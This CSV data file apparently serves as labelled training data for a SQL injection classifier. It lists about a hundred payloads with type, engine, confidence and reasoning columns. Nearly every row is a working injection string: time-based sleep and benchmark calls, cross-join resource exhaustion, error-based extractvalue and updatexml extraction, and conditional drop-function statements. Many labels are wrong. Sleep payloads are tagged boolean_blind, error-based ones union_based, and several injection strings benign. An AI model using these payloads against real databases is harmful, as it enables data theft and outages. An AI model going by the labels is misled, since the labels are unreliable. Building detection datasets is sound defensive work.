id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
32,"1' in boolean mode ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) #",heavy_query,db2,0.85,Resource-intensive token 'sysibm.systables' used for timing or DoS,1
33,"1%"" or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,generic,0.85,Resource-intensive token 'all_users' used for timing or DoS,1
34,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ""pawh"" = ""pawh",heavy_query,generic,0.85,Resource-intensive token '500000000' used for timing or DoS,2
35,( 1589 = 1589 ) *1,benign,generic,0.85,No malicious SQLi signals detected; payload appears to be a legitimate SQL fragment or keyword.,3
36,-5021'+ ( select yadq where 4285 = 4285 order by 1#,boolean_blind,generic,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,3
37,"1%' ) ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( '%' = '",boolean_blind,mysql,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,2
38,if ( 8284 = 6171 ) select 8284 else drop function mbih--,boolean_blind,generic,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,3
39,"-7868"" ) ) or 9323 = 9323#",boolean_blind,generic,0.85,Boolean comparison 'or 9323 = 9323' used for data inference,3
40,"1"" where 2462 = 2462 and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",heavy_query,generic,0.85,Resource-intensive token 'sysusers' used for timing or DoS,1
41,-7999 ) or 8422 = 1336,boolean_blind,generic,0.85,Boolean comparison 'or 8422 = 1336' used for data inference,3
42,"1 ) ) as potk where 5040 = 5040 or elt ( 5873 = 5873,sleep ( 5 ) ) #",boolean_blind,mysql,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,3
43,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( 'njnr' = 'njnr",heavy_query,db2,0.85,Resource-intensive token 'sysibm.systables' used for timing or DoS,1
44,"end and ( ( ""rqay"" like ""rqay",boolean_blind,generic,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,2
45,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( '%' = '",heavy_query,db2,0.85,Resource-intensive token 'sysibm.systables' used for timing or DoS,1
46,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( 4142 = 4142",heavy_query,generic,0.85,Resource-intensive token '500000000' used for timing or DoS,2
47,"1 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) # zcyc",heavy_query,generic,0.85,Resource-intensive token 'sysusers' used for timing or DoS,1
48,"1 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) -- loao",boolean_blind,generic,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,3
49,if ( 8858 = 5680 ) select 8858 else drop function pyuo--,boolean_blind,generic,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,3
50,"1 ) ) ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ( ( 1748 = 1748",error_based,mysql,0.85,Function 'extractvalue' used to trigger diagnostic error messages,2
51,"end and ( ""qkkn"" like ""qkkn",boolean_blind,generic,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,2
52,"1 ) where 6784 = 6784 and elt ( 3114 = 3114,sleep ( 5 ) ) #",boolean_blind,mysql,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,3
53,"1' and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 )",boolean_blind,generic,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,3
54,"1'|| ( select 'gboi' where 4191 = 4191 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) ) ||'",boolean_blind,generic,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,3
55,"1' ) ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( ( 'ejul' = 'ejul",union_based,mysql,0.85,UNION SELECT pattern used to aggregate results from unauthorized tables,1
56,"1"" ) as paai where 4089 = 4089 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.85,Resource-intensive token 'sysibm.systables' used for timing or DoS,1
57,"1"" ) ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",boolean_blind,mysql,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,2
58,1%' ) order by 1--,benign,generic,0.85,No malicious SQLi signals detected; payload appears to be a legitimate SQL fragment or keyword.,3
59,"end and ( ""vwbx"" = ""vwbx",boolean_blind,generic,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,2
60,"1' in boolean mode ) and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.85,Resource-intensive token 'sysibm.systables' used for timing or DoS,1
61,"-9087"" order by 1#",benign,generic,0.85,No malicious SQLi signals detected; payload appears to be a legitimate SQL fragment or keyword.,3
62,1'+ ( select twyt where 3376 = 3376 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) +',boolean_blind,oracle,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,3
63,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( ""eevk"" = ""eevk",heavy_query,generic,0.85,Resource-intensive token '500000000' used for timing or DoS,2
64,"1"" ) where 2136 = 2136 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",heavy_query,firebird,0.85,Resource-intensive token 'rdb$fields' used for timing or DoS,1
65,1' ) where 7629 = 7629 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,boolean_blind,mysql,0.85,Boolean logic detected via 'rlike' for inference The payload uses '1' ) where 7629 = 76...' which is characteristic of this SQLi type.,3
66,"1"" ) as duvm where 6190 = 6190 order by 1--",boolean_blind,generic,0.85,Classification 'boolean_blind' based on heuristic signal and secondary labeler agreement.,2
67,"1'|| ( select 'bnaz' from dual where 7168 = 7168 and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",heavy_query,oracle,0.85,Resource-intensive token 'sysusers' used for timing or DoS,1
68,"-7686%"" ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,generic,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,2
69,"1' where 3612 = 3612 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",boolean_blind,mysql,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,2
70,"1 ) ) ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ( 8814 = 8814",boolean_blind,generic,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,3
71,"-4785"" ) ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,generic,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,2
72,"1%' ) ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( ( '%' = '",union_based,mysql,0.85,UNION SELECT pattern used to aggregate results from unauthorized tables,1
73,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3-- ampw",boolean_blind,generic,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,3
74,1'+ ( select 'ljtl' where 1766 = 1766,boolean_blind,generic,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,3
75,"1' or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and 'ytlf' = 'ytlf",error_based,mysql,0.85,Function 'extractvalue' used to trigger diagnostic error messages,1
76,"1"" ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ""cdnc"" like ""cdnc",error_based,mysql,0.85,Function 'extractvalue' used to trigger diagnostic error messages,1
77,"1' and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and 'kwhs' like 'kwhs",boolean_blind,mysql,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,2
78,"1' or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and 'rhzy' = 'rhzy",heavy_query,generic,0.85,Resource-intensive token 'sysusers' used for timing or DoS,1
79,"1'+ ( select 'sbvh' where 8539 = 8539 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) ) +'",heavy_query,db2,0.85,Resource-intensive token 'sysibm.systables' used for timing or DoS,1
80,1'|| ( select 'uiyj' from dual where 8320 = 8320,boolean_blind,oracle,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,3
81,"1 where 1096 = 1096 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) --",error_based,mysql,0.85,Function 'extractvalue' used to trigger diagnostic error messages,1
82,"-9011"" ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,generic,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,2
83,"1 ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )",heavy_query,firebird,0.85,Resource-intensive token 'rdb$fields' used for timing or DoS,1
84,"1"" ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ""dppw"" like ""dppw",heavy_query,generic,0.85,Resource-intensive token 'all_users' used for timing or DoS,1
85,1'|| ( select 'zyvk' from dual where 2072 = 2072,boolean_blind,oracle,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,3
86,-6637' ) ) order by 1#,benign,generic,0.85,No malicious SQLi signals detected; payload appears to be a legitimate SQL fragment or keyword.,3
87,"1' ) ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",boolean_blind,mysql,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,2
88,"1"" ) where 7010 = 7010 and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,generic,0.85,Resource-intensive token 'all_users' used for timing or DoS,1
89,1'|| ( select 'cclo' from dual where 6823 = 6823 and 9198 = 9198--,boolean_blind,oracle,0.85,Boolean comparison 'and 9198 = 9198' used for data inference,3
90,"1%"" ) ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ""%"" = """,heavy_query,db2,0.85,Resource-intensive token 'sysibm.systables' used for timing or DoS,1
91,"1'+ ( select 'zohk' where 5502 = 5502 or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",heavy_query,firebird,0.85,Resource-intensive token 'rdb$fields' used for timing or DoS,1
92,"1%"" ) ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ( ""%"" = """,error_based,mysql,0.85,Function 'updatexml' used to trigger diagnostic error messages,1
93,"1%' ) ) ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ( ( '%' = '",error_based,mysql,0.85,Function 'updatexml' used to trigger diagnostic error messages,1
94,"1', ( select ( case when ( 2106 = 2106 ) then ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) else 2106* ( select 2106 from master..sysdatabases ) end ) )",heavy_query,mssql,0.85,Resource-intensive token 'sysusers' used for timing or DoS,1
95,"1 where 7051 = 7051 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",heavy_query,generic,0.85,Resource-intensive token 'sysusers' used for timing or DoS,1
96,"1"" ) ) ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",boolean_blind,mysql,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,2
97,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( ""%"" = """,heavy_query,generic,0.85,Resource-intensive token '500000000' used for timing or DoS,2
98,"1"" or elt ( 6272 = 6272,sleep ( 5 ) )",boolean_blind,mysql,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,2
99,"1%' ) ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",boolean_blind,mysql,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,2
100,"1' where 5702 = 5702 and elt ( 3114 = 3114,sleep ( 5 ) ) #",boolean_blind,mysql,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,3
101,"1"" ) ) as osuh where 8809 = 8809",boolean_blind,generic,0.85,Classification 'boolean_blind' based on heuristic signal and secondary labeler agreement.,2
102,1%' order by 1#,benign,generic,0.85,No malicious SQLi signals detected; payload appears to be a legitimate SQL fragment or keyword.,3
103,"1"" ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ""nwzu"" like ""nwzu",boolean_blind,mysql,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,2
104,"1"" ) ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ( ""hkjm"" like ""hkjm",boolean_blind,mysql,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,2
105,"1' ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ( 'mwyu' = 'mwyu",error_based,mysql,0.85,Function 'extractvalue' used to trigger diagnostic error messages,1
106,"1 ) ) procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",error_based,mysql,0.85,Function 'extractvalue' used to trigger diagnostic error messages,2
107,"1 where 3902 = 3902 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",boolean_blind,generic,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,3
108,"1'|| ( select 'oyyu' where 6765 = 6765 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) ) ||'",error_based,mysql,0.85,Function 'updatexml' used to trigger diagnostic error messages,1
109,"1"" ) ) as rcse where 4559 = 4559 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) --",error_based,mysql,0.85,Function 'extractvalue' used to trigger diagnostic error messages,1
110,"1"" ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ""oxvw"" = ""oxvw",boolean_blind,mysql,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,2
111,-9840' ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( 'dzlp' = 'dzlp,boolean_blind,oracle,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,3
112,"1'|| ( select 'svbf' where 7017 = 7017 or elt ( 6272 = 6272,sleep ( 5 ) ) ) ||'",boolean_blind,mysql,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,3
113,"1"" ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ""pfea"" = ""pfea",heavy_query,db2,0.85,Resource-intensive token 'sysibm.systables' used for timing or DoS,1
114,"-8209 ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,generic,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,2
115,-9826 where 4103 = 4103 order by 1#,boolean_blind,generic,0.85,Classification 'boolean_blind' based on heuristic signal and secondary labeler agreement.,2
116,1%' and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and '%' = ',boolean_blind,oracle,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,3
117,"1%' or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and '%' = '",heavy_query,firebird,0.85,Resource-intensive token 'rdb$fields' used for timing or DoS,1
118,"1"" where 6800 = 6800 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",error_based,mysql,0.85,Function 'extractvalue' used to trigger diagnostic error messages,2
119,"1"" and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ""egzm"" = ""egzm",error_based,mysql,0.85,Function 'updatexml' used to trigger diagnostic error messages,1
120,"end and ( ( ""%"" = """,boolean_blind,generic,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,2
121,"1"" ) ) as bbkl where 5686 = 5686",boolean_blind,generic,0.85,Classification 'boolean_blind' based on heuristic signal and secondary labeler agreement.,2
122,1'+ ( select 'cwta' where 6091 = 6091,boolean_blind,generic,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,3
123,"1"" ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ( ""xccy"" = ""xccy",error_based,mysql,0.85,Function 'extractvalue' used to trigger diagnostic error messages,1
124,"1"" ) as xioc where 7260 = 7260 or elt ( 5873 = 5873,sleep ( 5 ) ) #",boolean_blind,mysql,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,3
125,"-2298%' or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,generic,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,2
126,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4",heavy_query,firebird,0.85,Resource-intensive token 'rdb$fields' used for timing or DoS,1
127,"1"" ) ) as mvxa where 3024 = 3024",boolean_blind,generic,0.85,Classification 'boolean_blind' based on heuristic signal and secondary labeler agreement.,2
128,"1"" ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ""cneo"" like ""cneo",boolean_blind,mysql,0.85,"Boolean logic detected via 'rlike' for inference The payload uses '1"" ) rlike ( select ...' which is characteristic of this SQLi type.",3
129,"1%"" or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ""%"" = """,boolean_blind,generic,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,3
130,"1' ) ) and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.85,Resource-intensive token 'sysibm.systables' used for timing or DoS,1
131,"end and ( ""xksk"" = ""xksk",boolean_blind,generic,0.85,Classification 'boolean_blind' inherited from initial labeler hints due to structural pattern.,2
